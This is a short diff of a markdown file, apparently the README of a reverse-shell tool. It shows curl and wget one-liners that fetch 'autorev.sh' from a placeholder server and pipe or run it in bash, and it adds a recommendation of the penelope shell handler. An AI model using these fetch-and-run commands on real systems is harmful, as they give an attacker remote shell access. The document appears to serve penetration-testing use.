@@ -13,3 +13,4 @@ curl <your-temp-server-ip>/autorev.sh | bash
 ```
 wget <your-temp-server-ip>/autorev.sh -O /tmp/autorev.sh && bash /tmp/autorev.sh
 ```
+### Suggested shell handler - [penelope](https://github.com/brightio/penelope)  
